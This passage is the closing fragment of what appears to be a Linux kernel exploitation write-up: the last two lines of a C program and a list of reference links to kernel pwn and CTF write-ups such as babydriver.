    return 0;
}
```



## Reference

https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x04-Kernel-Heap-Use-After-Free

https://bbs.pediy.com/thread-247054.htm

https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html

http://muhe.live/2017/07/13/babydriver-writeup/

https://www.anquanke.com/post/id/86490
